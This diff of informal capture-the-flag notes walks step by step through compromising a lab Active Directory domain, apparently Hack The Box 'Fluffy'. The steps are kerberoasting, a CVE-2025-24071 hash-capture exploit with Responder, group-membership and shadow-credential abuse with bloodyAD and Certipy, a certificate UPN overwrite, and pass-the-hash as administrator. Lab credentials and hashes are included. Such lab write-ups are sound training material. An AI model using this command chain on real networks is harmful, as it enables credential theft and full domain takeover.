@@ -8,7 +8,6 @@ run sudo ntpdate ipaddress
 
 nxc smb dc01.fluffy.htb -u usernamne -p 'password'
 
-try ldap if line 7 works 
 
 nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt
 
@@ -20,4 +19,105 @@ hashcat -m13100 output.txt /usr/share/wordlist/rockyou.txt
 
 run rusthound-ce --domain fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
 
-or run bloodhound.py
+
+in bloodhound 
+look at Member of , look at outbound object control 
+
+
+nxc smb dc01.fluffy.htb -u usernamne -p 'password' --shares
+
+smbclient -U username -L //domain 
+
+smbclient -U username //domain/share
+download the upgrade file from the smb share 
+
+open the upgrade pdf file 
+
+search for CVE github POC
+
+use this github 
+https://github.com/0x6rss/CVE-2025-24071_PoC
+
+use sudo responder -I tun0
+
+in the smb connect 
+put the exploit.zip 
+
+put the ntlmv2 into a file 
+
+use hashcat to break the ntlmv2 
+
+hashcat filename /usr/share/wordlist/rockyou.txt
+
+
+go back to bloodhound
+
+find the new found user and add as pwnd 
+
+see what we can do with her credentials 
+
+
+nxc smb fluffy.htb -u p.agile -p 
+
+we need to add ourselvs to the group, 
+
+in bloodhound go to pathfinding to add ourselves to the service accounts 
+
+use bloodyAD
+
+use pipx install bloodyAD
+
+bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host 10.129.183.25 add groupMember 'service accounts' p.agila
+
+use certipy to create shadow credential
+
+install certipy
+pipx install certipy-ad
+
+certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.183.25
+certipy shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account ca_svc -dc-ip 10.129.183.25
+
+add the nt hashes to creds.txt
+
+do evil-winrm -i 10.129.183.25 -u winrm_svc -H 
+
+now we need to abuse the certificate account 
+
+search ca_svc and look at outbound connections 
+
+
+use certipy
+
+certipy find -username ca_svc -hashes :hash -dc-ip ip -vulnerable
+
+update principle name for ca certificate 
+
+first read the information
+certipy account -u p.agila -p -dc-ip ip address -user ca_svc read
+
+readd ourselves to the group
+
+bloodyAD -u p.agila -p prometheusx-303 -d fluffy.htb --host 10.129.183.25 add groupMember 'service accounts' p.agila
+
+and then 
+
+certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.183.25 -user ca_svc -upn winrm_svc update
+
+then change administrator
+certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.183.25 -user ca_svc -upn administrator update
+
+we now request a ticket 
+
+certipy req -u ca_svc -hashes :hash -ca FLUFFY-DC01-CA -template User -upn administrator -dc-ip 10.129.183.25
+
+can do 
+
+openssl pkcs12 -in administrator.pfx -nokeys | openssl x509 -noout -text
+
+
+certipy auth -dc-ip 10.129.183.25 -pfx administrator.pfx -username administrator -domain fluffy.htb
+
+evil-winrm -i10.129.183.25 -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
+
+
+
